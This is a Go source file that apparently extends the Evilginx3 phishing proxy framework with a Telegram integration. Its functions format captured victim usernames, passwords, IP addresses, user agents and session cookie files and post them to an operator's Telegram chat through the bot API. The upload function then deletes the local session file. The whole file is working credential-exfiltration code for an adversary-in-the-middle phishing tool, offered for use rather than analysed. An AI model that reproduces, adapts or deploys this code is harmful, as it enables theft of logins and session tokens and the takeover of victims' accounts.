package core

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"mime/multipart"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"github.com/kgretzky/evilginx2/log"
)

type TelegramBot struct {
	botToken    string
	chatID      string
	enabled     bool
	client      *http.Client
	msgQueue    chan *TelegramMessage
	wg          sync.WaitGroup
	stopChan    chan bool
}

type TelegramMessage struct {
	ChatID    string `json:"chat_id"`
	Text      string `json:"text"`
	ParseMode string `json:"parse_mode"`
}

func NewTelegramBot() *TelegramBot {
	return &TelegramBot{
		client: &http.Client{
			Timeout: 10 * time.Second,
		},
		msgQueue: make(chan *TelegramMessage, 100),
		stopChan: make(chan bool),
	}
}

func (t *TelegramBot) Start() {
	if !t.enabled || t.botToken == "" || t.chatID == "" {
		return
	}

	t.wg.Add(1)
	go t.messageWorker()
}

func (t *TelegramBot) Stop() {
	close(t.stopChan)
	t.wg.Wait()
}

func (t *TelegramBot) messageWorker() {
	defer t.wg.Done()

	for {
		select {
		case msg := <-t.msgQueue:
			if msg != nil {
				t.sendMessage(msg)
			}
		case <-t.stopChan:
			for len(t.msgQueue) > 0 {
				if msg := <-t.msgQueue; msg != nil {
					t.sendMessage(msg)
				}
			}
			return
		}
	}
}

func (t *TelegramBot) sendMessage(msg *TelegramMessage) error {
	if !t.enabled || t.botToken == "" || t.chatID == "" {
		return fmt.Errorf("telegram bot not configured")
	}

	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", t.botToken)

	jsonData, err := json.Marshal(msg)
	if err != nil {
		return err
	}

	req, err := http.NewRequest("POST", url, bytes.NewBuffer(jsonData))
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", "application/json")

	resp, err := t.client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("telegram API returned status code: %d", resp.StatusCode)
	}

	return nil
}

func (t *TelegramBot) SendCredentials(sessionID int, username, password, ip, userAgent, domain string, phishletName string) {
	if !t.enabled || t.botToken == "" || t.chatID == "" {
		return
	}

	timestamp := time.Now().Format("2006-01-02 15:04:05 MST")
	
	message := fmt.Sprintf(
		"%s capture\n\n"+
			"📧 Username: %s\n\n"+
			"🔑 Password: %s\n\n"+
			"🌐 IP: %s\n\n"+
			"📱 User-Agent: %s\n\n"+
			"🌐 Domain: %s\n\n"+
			"⏰ Time: %s",
		phishletName,
		escapeMarkdownV2(username),
		escapeMarkdownV2(password),
		escapeMarkdownV2(ip),
		escapeMarkdownV2(userAgent),
		escapeMarkdownV2(domain),
		escapeMarkdownV2(timestamp),
	)

	msg := &TelegramMessage{
		ChatID:    t.chatID,
		Text:      message,
		ParseMode: "MarkdownV2",
	}

	select {
	case t.msgQueue <- msg:
	default:
		log.Warning("telegram: message queue is full, dropping message")
	}
}

func (t *TelegramBot) SendFormattedSession(sessionID int, formattedMessage string) {
	if !t.enabled || t.botToken == "" || t.chatID == "" {
		return
	}

	msg := &TelegramMessage{
		ChatID:    t.chatID,
		Text:      formattedMessage,
		ParseMode: "",  
	}

	select {
	case t.msgQueue <- msg:
		log.Success("[%d] formatted session queued for telegram", sessionID)
	default:
		log.Warning("telegram: message queue is full, dropping formatted session")
	}
}

func (t *TelegramBot) SendTokensCapture(sessionID int, username, password, ip, domain string, phishletName string, cookieCount int) {
	if !t.enabled || t.botToken == "" || t.chatID == "" {
		return
	}

	message := fmt.Sprintf(
		"%s capture\n\n"+
			"📊 status: Tokens Captured\n\n"+
			"🍪 cookies: %d\n\n"+
			"📧 username: %s\n\n"+
			"🔑 password: %s\n\n"+
			"🌐 ip: %s\n\n"+
			"🌐 domain: %s\n\n"+
			"📎 cookies attached",
		phishletName,
		cookieCount,
		escapeMarkdownV2(username),
		escapeMarkdownV2(password),
		escapeMarkdownV2(ip),
		escapeMarkdownV2(domain),
	)

	msg := &TelegramMessage{
		ChatID:    t.chatID,
		Text:      message,
		ParseMode: "MarkdownV2",
	}

	select {
	case t.msgQueue <- msg:
	default:
		log.Warning("telegram: message queue is full, dropping message")
	}
}

func (t *TelegramBot) SendTestMessage() error {
	if t.botToken == "" || t.chatID == "" {
		return fmt.Errorf("telegram bot not configured")
	}

	message := "✅ *Evilginx3 Telegram Integration*\n\n" +
		"This is a test message to verify your Telegram bot configuration\\.\n" +
		"If you receive this message, your bot is properly configured\\!"

	msg := &TelegramMessage{
		ChatID:    t.chatID,
		Text:      message,
		ParseMode: "MarkdownV2",
	}

	return t.sendMessage(msg)
}

func (t *TelegramBot) SendDocument(filePath string, caption string) error {
	if !t.enabled || t.botToken == "" || t.chatID == "" {
		return fmt.Errorf("telegram bot not configured")
	}

	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendDocument", t.botToken)

	file, err := os.Open(filePath)
	if err != nil {
		return err
	}
	defer file.Close()

	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)

	part, err := writer.CreateFormFile("document", filepath.Base(filePath))
	if err != nil {
		return err
	}
	if _, err = io.Copy(part, file); err != nil {
		return err
	}

	if err := writer.WriteField("chat_id", t.chatID); err != nil {
		return err
	}

	if caption != "" {
		if err := writer.WriteField("caption", caption); err != nil {
			return err
		}
		if err := writer.WriteField("parse_mode", "MarkdownV2"); err != nil {
			return err
		}
	}

	if err := writer.Close(); err != nil {
		return err
	}

	req, err := http.NewRequest("POST", url, body)
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", writer.FormDataContentType())

	resp, err := t.client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("telegram API returned status code: %d", resp.StatusCode)
	}

	os.Remove(filePath)

	return nil
}

func (t *TelegramBot) SendSessionFile(sessionID int, filePath string, username, password, ip, domain string, phishletName string) {
	if !t.enabled || t.botToken == "" || t.chatID == "" {
		return
	}

	caption := fmt.Sprintf(
		"%s capture\n\n"+
			"📊 Status: Complete Session Captured\n\n"+
			"📧 Username: %s\n\n"+
			"🔑 Password: %s\n\n"+
			"🌐 IP: %s\n\n"+
			"🌐 Domain: %s\n\n"+
			"📎 Attached: Full session data with cookies",
		phishletName,
		escapeMarkdownV2(username),
		escapeMarkdownV2(password),
		escapeMarkdownV2(ip),
		escapeMarkdownV2(domain),
	)

	go func() {
		if err := t.SendDocument(filePath, caption); err != nil {
			log.Warning("telegram: failed to send session file: %v", err)
		}
	}()
}

func (t *TelegramBot) SetConfig(botToken, chatID string, enabled bool) {
	t.botToken = botToken
	t.chatID = chatID
	t.enabled = enabled
}

func (t *TelegramBot) GetConfig() TelegramConfig {
	return TelegramConfig{
		BotToken: t.botToken,
		ChatID:   t.chatID,
		Enabled:  t.enabled,
	}
}

func (t *TelegramBot) IsEnabled() bool {
	return t.enabled && t.botToken != "" && t.chatID != ""
}

func escapeMarkdown(text string) string {
	replacer := strings.NewReplacer(
		"_", "\\_",
		"*", "\\*",
		"[", "\\[",
		"]", "\\]",
		"(", "\\(",
		")", "\\)",
		"~", "\\~",
		"`", "\\`",
		">", "\\>",
		"#", "\\#",
		"+", "\\+",
		"-", "\\-",
		"=", "\\=",
		"|", "\\|",
		"{", "\\{",
		"}", "\\}",
		".", "\\.",
		"!", "\\!",
	)
	return replacer.Replace(text)
}

func escapeMarkdownV2(text string) string {
	replacer := strings.NewReplacer(
		"_", "\\_",
		"*", "\\*",
		"[", "\\[",
		"]", "\\]",
		"(", "\\(",
		")", "\\)",
		"~", "\\~",
		"`", "\\`",
		">", "\\>",
		"#", "\\#",
		"+", "\\+",
		"-", "\\-",
		"=", "\\=",
		"|", "\\|",
		"{", "\\{",
		"}", "\\}",
		".", "\\.",
		"!", "\\!",
	)
	return replacer.Replace(text)
}
